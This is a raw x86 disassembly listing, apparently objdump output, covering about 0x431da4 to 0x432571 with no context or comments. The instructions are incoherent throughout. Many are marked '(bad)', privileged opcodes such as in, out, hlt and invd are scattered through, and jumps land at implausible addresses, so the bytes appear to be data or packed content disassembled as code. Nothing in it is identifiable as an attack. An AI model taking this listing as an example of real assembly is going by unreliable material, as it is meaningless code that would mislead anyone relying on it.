  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
